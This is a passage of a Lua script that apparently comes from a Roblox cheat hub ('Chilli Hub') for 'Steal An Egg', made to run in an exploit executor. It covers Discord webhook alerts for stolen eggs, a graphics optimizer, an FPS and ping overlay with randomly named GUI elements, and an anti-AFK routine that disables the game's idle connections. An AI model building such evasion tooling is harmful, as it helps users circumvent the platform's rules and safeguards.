				local scaledHeight = math.max(1, math.floor(originalHeight * scaleFactor))
				local resizedBuffer = buffer.create(scaledWidth * scaledHeight * 4)

				for destRow = 0, scaledHeight - 1 do
					local sourceRow = math.min(originalHeight - 1, math.floor(destRow / scaleFactor))

					for destCol = 0, scaledWidth - 1 do
						buffer.copy(resizedBuffer, (destRow * scaledWidth + destCol) * 4, pixelBuffer, (sourceRow * originalWidth + math.min(originalWidth - 1, math.floor(destCol / scaleFactor))) * 4, 4)
					end
				end

				return encodeToPng(resizedBuffer, scaledWidth, scaledHeight)
			end)

			webhookConfig.Pngs[assetId] = ok and type(pngData) == "string" and pngData or false
			return webhookConfig.Pngs[assetId] or nil
		end

		local function color3ToDecimal(colorValue, useDefaultColor)
			if useDefaultColor then
				return 13686498
			end

			if typeof(colorValue) ~= "Color3" then
				return 5793266
			end
			return math.floor(colorValue.R * 255 + 0.5) * 65536 + math.floor(colorValue.G * 255 + 0.5) * 256 + math.floor(colorValue.B * 255 + 0.5)
		end

		local function formatAreaList(areaTable)
			local formattedNames = {}

			if type(areaTable) == "table" then
				for _, areaId in ipairs(areaTable) do
					formattedNames[#formattedNames + 1] = getAreaDisplayName(areaId)
				end
			end

			return #formattedNames > 0 and table.concat(formattedNames, ", ") or "None"
		end

		local function getAreaDisplayName(areaId)
			local areas = gameModules.Areas
			local hasAreas = type(areas) == "table"
			local areaDirectory

			if hasAreas then
				areaDirectory = areas.Directory or areas
			else
				areaDirectory = hasAreas
			end

			areaDirectory = areaDirectory or nil
			local areaKey = tostring(areaId or "")
			local areaData = type(areaDirectory) == "table" and areaKey ~= "" and areaDirectory[areaKey] or nil
			if type(areaData) == "table" then
				return tostring(areaData.DisplayName or areaKey)
			end
			return areaKey ~= "" and areaKey or "Field"
		end

		local function buildWebhookPayload(notificationType, eggCategory, eggScale, mutations, areas, extraData)
			local categoryStr = tostring(eggCategory)
			local eggInfo = eggPredictorHelper.AssetInfo(categoryStr)
			local scale = tonumber(eggScale) or 1
			mutations = type(mutations) == "table" and mutations or {}
			local eggValue = eggPredictorHelper.Income(eggInfo, scale, mutations)
			local dotSeparator = webhookConfig.Dot
			local scaleText = string.format("x%.2f", scale)
			local eggRecords = gameModules.EggRecords
			local fullScaleText

			if type(eggRecords) == "table" and type(eggRecords.WeightKgForScale) == "function" then
				local ok, weightResult = pcall(eggRecords.WeightKgForScale, categoryStr, scale)

				if ok and tonumber(weightResult) then
					fullScaleText = scaleText .. dotSeparator .. eggPredictorHelper.FormatWeight(weightResult)
				else
					fullScaleText = scaleText
				end
			else
				fullScaleText = scaleText
			end

			local emoji = webhookConfig.Emoji
			local descriptionLines = {}
			local eggTitle = "**" .. tostring(eggInfo.Name) .. "**" .. dotSeparator .. tostring(eggInfo.Rarity)
			local valueLine = emoji.Value .. " **Value:** $" .. eggPredictorHelper.FormatRate(eggValue)
			local sizeLine = emoji.Size .. " **Size:** " .. fullScaleText
			local mutationLine = emoji.Mutation .. " **Mutation:** " .. eggPredictorHelper.MutationText(mutations)
			local areaLine = emoji.Area .. " **Area:** " .. getAreaDisplayName(areas)
			descriptionLines[1] = eggTitle
			descriptionLines[2] = valueLine
			descriptionLines[3] = sizeLine
			descriptionLines[4] = mutationLine
			descriptionLines[5] = areaLine

			local embedData = {
				author = { name = localPlayer.DisplayName, icon_url = getPlayerAvatarUrl() },
				title = notificationType,
				description = table.concat(descriptionLines, "\n"),
				color = color3ToDecimal(eggInfo.Color, string.upper(tostring(eggInfo.Rarity)) == "SECRET"),
				footer = { text = "Chilli Hub" .. dotSeparator .. "Steal An Egg", icon_url = webhookConfig.Logo },
				timestamp = DateTime.now():ToIsoDate(),
			}

			local webhookPayload = { username = "Chilli Hub", avatar_url = webhookConfig.Logo, embeds = { embedData } }
			local iconAssetId = eggInfo.Icon

			if extraData then
				local assetsDirectory = gameModules.Assets and gameModules.Assets.Directory
				local assetData = type(assetsDirectory) == "table" and assetsDirectory[categoryStr] or nil
				local eggData = type(assetData) == "table" and type(assetData.Egg) == "table" and assetData.Egg or nil

				if eggData and eggData.Icon ~= nil then
					iconAssetId = eggData.Icon
				end
			end

			local extractedAssetId = tonumber(string.match(tostring(iconAssetId or ""), "(%d+)"))
			local pngData = extractedAssetId and getAssetPngData(extractedAssetId) or nil
			local fallbackUrl = extractedAssetId and not pngData and getAssetThumbnail(extractedAssetId) or nil

			if pngData then
				embedData.thumbnail = { url = "attachment://egg.png" }
				webhookPayload.attachments = { { id = 0, filename = "egg.png" } }
			elseif fallbackUrl then
				embedData.thumbnail = { url = fallbackUrl }
			end

			return webhookPayload, pngData
		end

		local function processWebhookQueue()
			if webhookConfig.Sending then
				return
			end
			webhookConfig.Sending = true

			task.spawn(function()
				while #webhookConfig.Queue > 0 and not webhookConfig.Disposed do
					local queueItem = table.remove(webhookConfig.Queue, 1)

					if isValidDiscordWebhook(webhookConfig.Url) and type(httpRequest) == "function" then
						local requestConfig = { Url = webhookConfig.Url, Method = "POST" }

						if queueItem.Png then
							local boundaryStr = "ChilliHub" .. string.gsub(HttpService:GenerateGUID(false), "-", "")
							requestConfig.Headers = { ["Content-Type"] = "multipart/form-data; boundary=" .. boundaryStr }
							local concatFunc = table.concat
							local bodyParts = {}
							local pngBytes = queueItem.Png
							local jsonPayload = HttpService:JSONEncode(queueItem.Payload)
							bodyParts[1] = "--"
							bodyParts[2] = boundaryStr
							bodyParts[3] = "\r\n"
							bodyParts[4] = "Content-Disposition: form-data; name=\"payload_json\"\r\n"
							bodyParts[5] = "Content-Type: application/json\r\n\r\n"
							bodyParts[6] = jsonPayload
							bodyParts[7] = "\r\n"
							bodyParts[8] = "--"
							bodyParts[9] = boundaryStr
							bodyParts[10] = "\r\n"
							bodyParts[11] = "Content-Disposition: form-data; name=\"files[0]\"; filename=\"egg.png\"\r\n"
							bodyParts[12] = "Content-Type: image/png\r\n\r\n"
							bodyParts[13] = pngBytes
							bodyParts[14] = "\r\n"
							bodyParts[15] = "--"
							bodyParts[16] = boundaryStr
							bodyParts[17] = "--\r\n"
							requestConfig.Body = concatFunc(bodyParts)
						else
							requestConfig.Headers = { ["Content-Type"] = "application/json" }
							requestConfig.Body = HttpService:JSONEncode(queueItem.Payload)
						end

						local ok, response = pcall(httpRequest, requestConfig)
						ok = ok and type(response) == "table" and tonumber(response.StatusCode) or nil

						if ok == 429 and queueItem.Tries < 3 then
							queueItem.Tries = queueItem.Tries + 1
							table.insert(webhookConfig.Queue, 1, queueItem)
							task.wait(3)
						elseif ok ~= 200 and ok ~= 204 and queueItem.Png then
							queueItem.Png = nil
							queueItem.Payload.attachments = nil
							local embedInPayload = type(queueItem.Payload.embeds) == "table" and queueItem.Payload.embeds[1] or nil

							if embedInPayload then
								embedInPayload.thumbnail = nil
							end

							table.insert(webhookConfig.Queue, 1, queueItem)
						end
					end

					task.wait(1.2)
				end

				webhookConfig.Sending = false
			end)
		end

		local function isWebhookConfigured()
			return type(httpRequest) == "function" and isValidDiscordWebhook(webhookConfig.Url)
		end

		local function queueWebhookNotification(payload, pngAttachment)
			if #webhookConfig.Queue >= 20 then
				table.remove(webhookConfig.Queue, 1)
			end

			if webhookConfig.PingEveryone and type(payload) == "table" then
				payload.content = "@everyone"
				payload.allowed_mentions = { parse = { "everyone" } }
			end

			table.insert(webhookConfig.Queue, { Payload = payload, Png = pngAttachment, Tries = 0 })
			processWebhookQueue()
		end

		local eggState = gameModules.EggState
		local carryChangedSignal = type(eggState) == "table" and eggState.CarryChanged or nil

		if type(carryChangedSignal) == "table" and type(carryChangedSignal.Connect) == "function" then
			local ok, connection = pcall(carryChangedSignal.Connect, carryChangedSignal, function(carryState)
				if type(carryState) ~= "table" then
					return
				end

				if carryState.IsCarrying then
					webhookConfig.Carry = {
						Category = tostring(carryState.AssetCategory),
						Uid = tostring(carryState.Uid),
						Area = tostring(carryState.AreaId or "Field"),
						EndedAt = nil,
					}
				elseif webhookConfig.Carry then
					webhookConfig.Carry.EndedAt = os.clock()
				end
			end)

			if ok and connection then
				trackCleanup(function()
					pcall(function()
						connection:Disconnect()
					end)
				end)
			end
		end

		trackCleanup(function()
			webhookConfig.Disposed = true
		end)

		task.spawn(function()
			while not webhookConfig.Disposed do
				local ownedEggsData = getOwnerEggs()
				local readSuccess = type(ownedEggsData) == "table" and next(ownedEggsData) ~= nil

				if readSuccess and type(ownedEggsData) == "table" then
					local previouslyKnownEggs = webhookConfig.Known
					local newEggsFound = {}
					local currentKnownEggs = {}

					for eggUid, eggRecord in pairs(ownedEggsData) do
						local uidStr = tostring(eggUid)
						currentKnownEggs[uidStr] = true

						if previouslyKnownEggs and not previouslyKnownEggs[uidStr] and type(eggRecord) == "table" then
							newEggsFound[#newEggsFound + 1] = { Uid = uidStr, Record = eggRecord }
						end
					end

					webhookConfig.Known = currentKnownEggs
					local carryInfo = webhookConfig.Carry

					if webhookConfig.Stolen and carryInfo and #newEggsFound > 0 then
						for _, newEgg in ipairs(newEggsFound) do
							local eggRecord = newEgg.Record
							local isRecentCarry = carryInfo.EndedAt == nil

							if not isRecentCarry then
								local carryEndTime = carryInfo.EndedAt
								isRecentCarry = os.clock() - carryEndTime < 20
							end

							if isRecentCarry then
								isRecentCarry = newEgg.Uid == carryInfo.Uid

								if not isRecentCarry then
									local carriedCategory = carryInfo.Category
									isRecentCarry = tostring(eggRecord.AssetCategory) == carriedCategory
								end
							end

							if isRecentCarry then
								webhookConfig.Carry = nil
								local eggMutations = type(eggRecord.Mutations) == "table" and eggRecord.Mutations or {}

								task.spawn(function()
									if isWebhookConfigured() then
										queueWebhookNotification(buildWebhookPayload("Egg Stolen!", eggRecord.AssetCategory, eggRecord.AssetScale, eggMutations, carryInfo.Area))
									end
								end)

								break
							end
						end
					end
				end

				task.wait(1.5)
			end
		end)

		local function updateWebhookInputField(newUrl)
			local inputWidget = webhookConfig.Input
			if type(inputWidget) ~= "table" then
				return
			end

			for _, methodName in ipairs({ "Set", "SetValue" }) do
				local ok, method = pcall(function()
					return inputWidget[methodName]
				end)

				if ok and type(method) == "function" and pcall(method, inputWidget, newUrl, false) then
					return
				end
			end
		end

		if not discordWebhookSection and hubWindow and type(hubWindow.CreateTab) == "function" then
			pcall(function()
				local wbTab = hubWindow:CreateTab({ Name = "Webhook", SectionsExpanded = false })
				discordWebhookSection = wbTab and wbTab:CreateSection({ Name = "Discord Webhook", Expanded = false })
			end)
		end

		if discordWebhookSection and type(discordWebhookSection.CreateInput) == "function" then
			webhookConfig.Input = discordWebhookSection:CreateInput({
			Name = "Webhook URL",
			Placeholder = "https://discord.com/api/webhooks/...",
			Default = webhookConfig.Saved,
			MaxLength = 256,
			Callback = function(inputValue)
				local cleanedUrl = string.gsub(tostring(inputValue or ""), "%s", "")
				local shouldRestoreSaved = cleanedUrl == "" and webhookConfig.Saved ~= ""

				if shouldRestoreSaved then
					local timeLoaded = webhookConfig.LoadedAt
					shouldRestoreSaved = os.clock() - timeLoaded < 5
				end

				if shouldRestoreSaved then
					webhookConfig.Url = webhookConfig.Saved
					task.defer(updateWebhookInputField, webhookConfig.Saved)
					return
				end

				webhookConfig.Url = cleanedUrl

				if (cleanedUrl == "" or isValidDiscordWebhook(cleanedUrl)) and cleanedUrl ~= webhookConfig.Saved and type(writefile) == "function" then
					if pcall(writefile, webhookConfig.Path, cleanedUrl) then
						webhookConfig.Saved = cleanedUrl
					end
				end
			end,
		})

		discordWebhookSection:CreateToggle({
			Name = "Ping @everyone",
			Default = false,
			Callback = function(enabled)
				webhookConfig.PingEveryone = enabled == true
			end,
		})

		discordWebhookSection:CreateToggle({
			Name = "Notify Stolen Eggs",
			Note = "Post every egg you bring home",
			Default = false,
			Callback = function(enabled)
				webhookConfig.Stolen = enabled == true
			end,
		})
		end
	end

	local miscTab
	-- ══════════════════════════════════════════════════════════════════════════
	-- ⚙️ [SECTION 6] MISC TAB - PERFORMANCE, OPTIMIZER & UTILITY
	-- ══════════════════════════════════════════════════════════════════════════
	miscTab = hubWindow:CreateTab({ Name = "Misc", SectionsExpanded = true })
	local performanceSection
	performanceSection = miscTab:CreateSection({ Name = "Performance", Expanded = true })
	local fpsCapUnavailableWarned = false

	performanceSection:CreateSlider({
		Name = "FPS Cap",
		Min = 30,
		Max = 1000,
		Default = 240,
		AllowDecimals = false,
		Increment = 1,
		Unit = " FPS",
		Callback = function(fpsValue)
			local clampedFps = math.clamp(math.floor(tonumber(fpsValue) or 240), 30, 1000)
			if type(setfpscap) == "function" and pcall(setfpscap, clampedFps) then
				fpsCapUnavailableWarned = false
				return
			end

			if not fpsCapUnavailableWarned then
				fpsCapUnavailableWarned = true
				showNotification("FPS Cap Unavailable", "This environment does not support setfpscap.")
			end
		end,
	})

	do
		local Lighting = game:GetService("Lighting")
		local optimizerLoopInterval = 0.003
		local optimizerEnabled = false
		local optimizerSessionId = 0
		local optimizerThread = nil
		local optimizerConnections = {}
		local optimizerSavedSettings = {}
		local optimizerSavedProps = setmetatable({}, { __mode = "k" })
		local optimizerProcessQueue = {}
		local optimizerHeartbeat = nil

		local function saveGlobalSetting(getterFunc, setterFunc, newValue)
			local ok, currentValue = pcall(getterFunc)
			if not ok then
				return
			end
			optimizerSavedSettings[#optimizerSavedSettings + 1] = { Setter = setterFunc, Value = currentValue }
			pcall(setterFunc, newValue)
		end

		local function saveInstanceProperty(instance, propertyName, newValue)
			local instanceProps = optimizerSavedProps[instance]

			if not instanceProps then
				instanceProps = {}
				optimizerSavedProps[instance] = instanceProps
			end

			if instanceProps[propertyName] == nil then
				local ok, originalValue = pcall(function()
					return instance[propertyName]
				end)

				if not ok then
					return
				end
				instanceProps[propertyName] = { Value = originalValue }
			end

			pcall(function()
				instance[propertyName] = newValue
			end)
		end

		local function stripEffectsFromInstance(instance)
			if not optimizerEnabled or not instance.Parent then
				return
			end

			if instance:IsA("ParticleEmitter") then
				saveInstanceProperty(instance, "Enabled", false)
				saveInstanceProperty(instance, "Rate", 0)
			elseif instance:IsA("Trail") or instance:IsA("Beam") then
				saveInstanceProperty(instance, "Enabled", false)
			elseif instance:IsA("PointLight") or instance:IsA("SpotLight") or instance:IsA("SurfaceLight") then
				saveInstanceProperty(instance, "Enabled", false)
				saveInstanceProperty(instance, "Brightness", 0)
			elseif instance:IsA("Fire") or instance:IsA("Smoke") or instance:IsA("Sparkles") then
				saveInstanceProperty(instance, "Enabled", false)
			elseif instance:IsA("Explosion") then
				saveInstanceProperty(instance, "Visible", false)
			elseif instance:IsA("SpecialMesh") then
				saveInstanceProperty(instance, "TextureId", "")
			elseif instance:IsA("Decal") or instance:IsA("Texture") then
				if not (instance.Name == "face" and instance.Parent and instance.Parent.Name == "Head") then
					saveInstanceProperty(instance, "Transparency", 1)
				end
			elseif instance:IsA("MeshPart") then
				saveInstanceProperty(instance, "RenderFidelity", Enum.RenderFidelity.Performance)
				saveInstanceProperty(instance, "TextureID", "")
				saveInstanceProperty(instance, "CastShadow", false)
				saveInstanceProperty(instance, "Reflectance", 0)
				saveInstanceProperty(instance, "Material", Enum.Material.SmoothPlastic)
			elseif instance:IsA("BasePart") then
				saveInstanceProperty(instance, "CastShadow", false)
				saveInstanceProperty(instance, "Reflectance", 0)
				saveInstanceProperty(instance, "Material", Enum.Material.SmoothPlastic)
			elseif instance:IsA("PostEffect") then
				saveInstanceProperty(instance, "Enabled", false)
			elseif instance:IsA("Clouds") then
				saveInstanceProperty(instance, "Cover", 0)
				saveInstanceProperty(instance, "Density", 0)
			elseif instance:IsA("Atmosphere") then
				saveInstanceProperty(instance, "Density", 0)
				saveInstanceProperty(instance, "Haze", 0)
				saveInstanceProperty(instance, "Glare", 0)
			end
		end

		local function clearOptimizerConnections()
			for _, connection in ipairs(optimizerConnections) do
				if connection.Connected then
					connection:Disconnect()
				end
			end

			table.clear(optimizerConnections)

			if optimizerHeartbeat then
				pcall(function()
					optimizerHeartbeat:Disconnect()
				end)

				optimizerHeartbeat = nil
			end
		end

		local function applyGlobalOptimizations()
			local rendering = settings().Rendering
			local terrain = workspace.Terrain

			local function saveGlobalWrapper(object, propertyName, optimizedValue)
				saveGlobalSetting(function()
					return object[propertyName]
				end, function(newValue)
					object[propertyName] = newValue
				end, optimizedValue)
			end

			saveGlobalWrapper(rendering, "QualityLevel", Enum.QualityLevel.Level01)
			saveGlobalWrapper(rendering, "MeshPartDetailLevel", Enum.MeshPartDetailLevel.Level01)
			saveGlobalWrapper(rendering, "EditQualityLevel", Enum.QualityLevel.Level01)

			local ok, userGameSettings = pcall(function()
				return UserSettings():GetService("UserGameSettings")
			end)

			if ok and userGameSettings then
				saveGlobalWrapper(userGameSettings, "SavedQualityLevel", Enum.SavedQualitySetting.QualityLevel1)
			end

			saveGlobalWrapper(Lighting, "GlobalShadows", false)
			saveGlobalWrapper(Lighting, "ShadowSoftness", 0)
			saveGlobalWrapper(Lighting, "FogEnd", 9e9)
			saveGlobalWrapper(Lighting, "Technology", Enum.Technology.Legacy)
			saveGlobalWrapper(Lighting, "EnvironmentDiffuseScale", 0)
			saveGlobalWrapper(Lighting, "EnvironmentSpecularScale", 0)
			saveGlobalWrapper(terrain, "Decoration", false)
			saveGlobalWrapper(terrain, "WaterWaveSize", 0)
			saveGlobalWrapper(terrain, "WaterWaveSpeed", 0)
			saveGlobalWrapper(terrain, "WaterReflectance", 0)
			saveGlobalWrapper(terrain, "WaterTransparency", 1)
		end

		local function scanInstanceDescendants(rootInstance, sessionId)
			local startTime = os.clock()

			for _, descendant in ipairs(rootInstance:GetDescendants()) do
				if not optimizerEnabled or optimizerSessionId ~= sessionId then
					return false
				end
				stripEffectsFromInstance(descendant)

				if os.clock() - startTime > optimizerLoopInterval then
					RunService.Heartbeat:Wait()
					startTime = os.clock()
				end
			end

			return true
		end

		local function processOptimizerQueue()
			if not optimizerEnabled or #optimizerProcessQueue == 0 then
				return
			end
			local startTime = os.clock()

			while #optimizerProcessQueue > 0 do
				local queuedInstance = table.remove(optimizerProcessQueue)
				stripEffectsFromInstance(queuedInstance)
				if not (os.clock() - startTime > optimizerLoopInterval) then
					continue
				end
				break
			end
		end

		local function restoreOptimizedProperties()
			local startTime = os.clock()

			for instance, properties in pairs(optimizerSavedProps) do
				if instance.Parent then
					for propName, propData in pairs(properties) do
						pcall(function()
							instance[propName] = propData.Value
						end)
					end
				end

				optimizerSavedProps[instance] = nil

				if optimizerLoopInterval < os.clock() - startTime then
					RunService.Heartbeat:Wait()
					startTime = os.clock()
				end
			end
		end

		local function disableOptimizer()
			if not optimizerEnabled then
				return
			end
			optimizerEnabled = false
			optimizerSessionId += 1
			clearOptimizerConnections()
			table.clear(optimizerProcessQueue)

			if optimizerThread then
				pcall(task.cancel, optimizerThread)
				optimizerThread = nil
			end

			restoreOptimizedProperties()

			for i = #optimizerSavedSettings, 1, -1 do
				local setting = optimizerSavedSettings[i]
				pcall(setting.Setter, setting.Value)
			end

			table.clear(optimizerSavedSettings)
		end

		local function enableOptimizer()
			if optimizerEnabled then
				return
			end
			optimizerEnabled = true
			optimizerSessionId += 1
			local currentSessionId = optimizerSessionId
			applyGlobalOptimizations()

			local function watchDescendantsAdded(container)
				optimizerConnections[#optimizerConnections + 1] = container.DescendantAdded:Connect(function(descendant)
					if optimizerEnabled and optimizerSessionId == currentSessionId then
						optimizerProcessQueue[#optimizerProcessQueue + 1] = descendant
					end
				end)
			end

			watchDescendantsAdded(workspace)
			watchDescendantsAdded(Lighting)

			optimizerHeartbeat = RunService.Heartbeat:Connect(function()
				if optimizerEnabled and optimizerSessionId == currentSessionId then
					processOptimizerQueue()
				end
			end)

			optimizerThread = task.spawn(function()
				if scanInstanceDescendants(workspace, currentSessionId) then
					scanInstanceDescendants(Lighting, currentSessionId)
				end
			end)
		end

		trackCleanup(disableOptimizer)

		performanceSection:CreateToggle({
			Name = "Optimizer",
			Note = "Strip shadows, textures and effects for the highest FPS",
			Default = false,
			Callback = function(enabled)
				if enabled then
					enableOptimizer()
				else
					task.spawn(disableOptimizer)
				end
			end,
		})
	end

	do
		local Stats = game:GetService("Stats")
		local overlayBaseWidth = 132
		local overlayScaleFactor = 0.085
		local overlayUpdateInterval = 0.2
		local fpsSmoothingFactor = 8
		local fpsPingPositionState = hubWindow:CreateState({ Name = "FPS and Ping Position", Default = {} })

		local function getFpsPingOverlayPosition()
			local savedPosition = fpsPingPositionState:Get()
			if type(savedPosition) == "table" and type(savedPosition.XOffset) == "number" and type(savedPosition.YOffset) == "number" then
				return UDim2.new(tonumber(savedPosition.XScale) or 0, savedPosition.XOffset, tonumber(savedPosition.YScale) or 0, savedPosition.YOffset)
			end
			return UDim2.new(0, 16, 0, 16)
		end

		local function saveFpsPingOverlayPosition(position)
			fpsPingPositionState:Set({ XScale = position.X.Scale, XOffset = position.X.Offset, YScale = position.Y.Scale, YOffset = position.Y.Offset })
		end

		local getFpsPingPosition = getFpsPingOverlayPosition
		local saveFpsPingPosition = saveFpsPingOverlayPosition

		local fpsColorGood = Color3.fromRGB(58, 255, 55)
		local fpsColorOkay = Color3.fromRGB(255, 214, 84)
		local fpsColorBad = Color3.fromRGB(255, 96, 96)
		local overlayTextColor = Color3.fromRGB(150, 150, 158)
		local fpsTextColor = overlayTextColor
		local overlayActive = false
		local overlayEnabled = false
		local overlayConnections = {}
		local overlayScreenGui = nil
		local overlayFrame = nil
		local overlayFrameContainer = nil
		local overlayUiScale = nil
		local fpsLabel = nil
		local overlayFpsLabel = nil
		local pingLabel = nil
		local overlayPingLabel = nil
		local overlayScale = 1
		local overlayScaleMult = 1
		local smoothedFps = 0
		local currentFps = 0
		local nextOverlayUpdate = 0
		local nextUpdateTime = 0
		local lastFpsDisplayed = nil
		local lastFpsText = nil
		local lastPingDisplayed = nil
		local lastPingText = nil
		local gothamBoldFont = nil
		local gothamFont = nil

		pcall(function()
			gothamBoldFont = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.ExtraBold, Enum.FontStyle.Normal)
			gothamFont = gothamBoldFont
		end)

		local function getFpsColor(fpsValue)
			if fpsValue >= 100 then
				return fpsColorGood
			end

			if fpsValue >= 50 then
				return fpsColorOkay
			end
			return fpsColorBad
		end

		local function getPingColor(pingValue)
			if pingValue <= 90 then
				return fpsColorGood
			end

			if pingValue <= 180 then
				return fpsColorOkay
			end
			return fpsColorBad
		end

		local function updateOverlayScale()
			if not overlayUiScale then
				return
			end
			local currentCamera = workspace.CurrentCamera
			local viewportSize = currentCamera and currentCamera.ViewportSize or Vector2.new(1280, 720)

			if viewportSize.X < 1 then
				viewportSize = Vector2.new(1280, 720)
			end

			overlayUiScale.Scale = math.clamp(viewportSize.X * overlayScaleFactor / overlayBaseWidth, 0.7, 1.4) * overlayScaleMult
		end

		local function destroyOverlay()
			for _, conn in ipairs(overlayConnections) do
				pcall(function()
					conn:Disconnect()
				end)
			end

			table.clear(overlayConnections)

			if overlayScreenGui then
				pcall(function()
					overlayScreenGui:Destroy()
				end)
			end

			overlayScreenGui = nil
			overlayFrame = nil
			overlayUiScale = nil
			fpsLabel = nil
			pingLabel = nil
			lastFpsText = nil
			lastPingText = nil
			currentFps = 0
		end

		local function createTextLabel(parent, xOffset, width, textColor3)
			local textLabel = Instance.new("TextLabel")
			textLabel.Name = generateRandomKey()
			textLabel.BackgroundTransparency = 1
			textLabel.Position = UDim2.fromOffset(xOffset, 9)
			textLabel.Size = UDim2.fromOffset(width, 16)
			textLabel.Text = ""
			textLabel.TextColor3 = textColor3
			textLabel.TextScaled = true
			textLabel.TextXAlignment = Enum.TextXAlignment.Left

			if gothamFont then
				textLabel.FontFace = gothamFont
			else
				textLabel.Font = Enum.Font.GothamBold
			end

			textLabel.Parent = parent
			return textLabel
		end

		local function createOverlay()
			destroyOverlay()
			overlayScreenGui = Instance.new("ScreenGui")
			overlayScreenGui.Name = generateRandomKey()
			overlayScreenGui.Archivable = false
			overlayScreenGui.DisplayOrder = 58
			overlayScreenGui.IgnoreGuiInset = true
			overlayScreenGui.ResetOnSpawn = false
			overlayScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
			overlayFrame = Instance.new("Frame")
			overlayFrame.Name = generateRandomKey()
			overlayFrame.Active = true
			overlayFrame.BackgroundColor3 = Color3.fromRGB(24, 24, 28)
			overlayFrame.BackgroundTransparency = 0.28
			overlayFrame.BorderSizePixel = 0
			overlayFrame.Position = getFpsPingPosition()
			overlayFrame.Size = UDim2.fromOffset(132, 34)
			overlayFrame.Parent = overlayScreenGui
			local uiCorner = Instance.new("UICorner")
			uiCorner.Name = generateRandomKey()
			uiCorner.CornerRadius = UDim.new(0, 12)
			uiCorner.Parent = overlayFrame
			local uiStroke = Instance.new("UIStroke")
			uiStroke.Name = generateRandomKey()
			uiStroke.Color = Color3.fromRGB(255, 255, 255)
			uiStroke.Thickness = 1
			uiStroke.Transparency = 0.9
			uiStroke.Parent = overlayFrame
			overlayUiScale = Instance.new("UIScale")
			overlayUiScale.Name = generateRandomKey()
			overlayUiScale.Parent = overlayFrame
			updateOverlayScale()
			fpsLabel = createTextLabel(overlayFrame, 12, 34, fpsColorGood)
			createTextLabel(overlayFrame, 48, 22, fpsTextColor).Text = "FPS"
			local dividerLine = Instance.new("Frame")
			dividerLine.Name = generateRandomKey()
			dividerLine.AnchorPoint = Vector2.new(0.5, 0.5)
			dividerLine.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			dividerLine.BackgroundTransparency = 0.85
			dividerLine.BorderSizePixel = 0
			dividerLine.Position = UDim2.new(0, 74, 0.5, 0)
			dividerLine.Size = UDim2.fromOffset(1, 14)
			dividerLine.Parent = overlayFrame
			pingLabel = createTextLabel(overlayFrame, 82, 30, fpsColorGood)
			createTextLabel(overlayFrame, 113, 14, fpsTextColor).Text = "ms"
			overlayScreenGui.Parent = uiParent
			local currentCamera = workspace.CurrentCamera

			if currentCamera then
				overlayConnections[#overlayConnections + 1] = currentCamera:GetPropertyChangedSignal("ViewportSize"):Connect(updateOverlayScale)
			end

			local isDraggingOverlay = false
			local overlayDragInput = nil
			local overlayDragStartPos = Vector2.zero
			local overlayStartFramePos = nil

			overlayConnections[#overlayConnections + 1] = overlayFrame.InputBegan:Connect(function(input)
				if isDraggingOverlay or input.UserInputState ~= Enum.UserInputState.Begin then
					return
				end
				local isTouch = input.UserInputType == Enum.UserInputType.Touch
				if not (input.UserInputType == Enum.UserInputType.MouseButton1) and not isTouch then
					return
				end
				isDraggingOverlay = true
				overlayDragInput = isTouch and input or nil
				overlayDragStartPos = Vector2.new(input.Position.X, input.Position.Y)
				overlayStartFramePos = overlayFrame.Position
			end)

			overlayConnections[#overlayConnections + 1] = UserInputService.InputChanged:Connect(function(input)
				if not isDraggingOverlay or not overlayFrame or not overlayStartFramePos then
					return
				end

				if not (overlayDragInput and input == overlayDragInput or not overlayDragInput and input.UserInputType == Enum.UserInputType.MouseMovement) then
					return
				end
				local delta = Vector2.new(input.Position.X, input.Position.Y) - overlayDragStartPos
				overlayFrame.Position = UDim2.new(overlayStartFramePos.X.Scale, overlayStartFramePos.X.Offset + delta.X, overlayStartFramePos.Y.Scale, overlayStartFramePos.Y.Offset + delta.Y)
			end)

			overlayConnections[#overlayConnections + 1] = UserInputService.InputEnded:Connect(function(input)
				if not isDraggingOverlay then
					return
				end

				if overlayDragInput and input == overlayDragInput or not overlayDragInput and input.UserInputType == Enum.UserInputType.MouseButton1 then
					isDraggingOverlay = false
					overlayDragInput = nil
					overlayStartFramePos = nil

					if overlayFrame then
						saveFpsPingPosition(overlayFrame.Position)
					end
				end
			end)

			overlayConnections[#overlayConnections + 1] = RunService.RenderStepped:Connect(function(deltaTime)
				if not overlayEnabled or not fpsLabel then
					return
				end
				local dtClamped = math.clamp(deltaTime, 0.001, 1)
				local instantaneousFps = 1 / dtClamped

				if currentFps <= 0 then
					currentFps = instantaneousFps
				else
					currentFps += (instantaneousFps - currentFps) * (1 - math.exp(-dtClamped * fpsSmoothingFactor))
				end

				local now = os.clock()
				if now < nextUpdateTime then
					return
				end
				nextUpdateTime = now + overlayUpdateInterval
				local roundedFps = math.floor(currentFps + 0.5)
				local fpsText = tostring(roundedFps)

				if fpsText ~= lastFpsText then
					lastFpsText = fpsText
					fpsLabel.Text = fpsText
					fpsLabel.TextColor3 = getFpsColor(roundedFps)
				end

				local pingValue = 0

				pcall(function()
					pingValue = Stats.Network.ServerStatsItem["Data Ping"]:GetValue()
				end)

				local roundedPing = math.floor(pingValue + 0.5)
				local pingText = tostring(roundedPing)

				if pingText ~= lastPingText then
					lastPingText = pingText
					pingLabel.Text = pingText
					pingLabel.TextColor3 = getPingColor(roundedPing)
				end
			end)
		end

		performanceSection:CreateSlider({
			Name = "FPS and Ping Size",
			Min = 60,
			Max = 160,
			Default = 100,
			AllowDecimals = false,
			Increment = 1,
			Unit = "%",
			SubOf = performanceSection:CreateToggle({
				Name = "FPS and Ping",
				Default = true,
				Callback = function(enabled)
					overlayEnabled = enabled == true

					if overlayEnabled then
						createOverlay()
					else
						destroyOverlay()
					end
				end,
			}),
			Callback = function(scalePercent)
				overlayScaleMult = math.clamp((tonumber(scalePercent) or 100) / 100, 0.6, 1.6)
				updateOverlayScale()
			end,
		})

		trackCleanup(destroyOverlay)
	end

	do
		local utilitySection = miscTab:CreateSection({ Name = "Utility", Expanded = true })
		local antiAfkState = { Enabled = true, Alive = true, Silenced = {} }

		local function getIdledConnections()
			if type(getconnections) ~= "function" then
				return {}
			end
			local ok, result = pcall(getconnections, localPlayer.Idled)
			return ok and type(result) == "table" and result or {}
		end

		local function disableIdledConnections()
			for _, conn in ipairs(getIdledConnections()) do
				if pcall(function()
					conn:Disable()
				end) then
					antiAfkState.Silenced[#antiAfkState.Silenced + 1] = conn
				end
			end
		end

		local function enableIdledConnections()
			local silenced = antiAfkState.Silenced
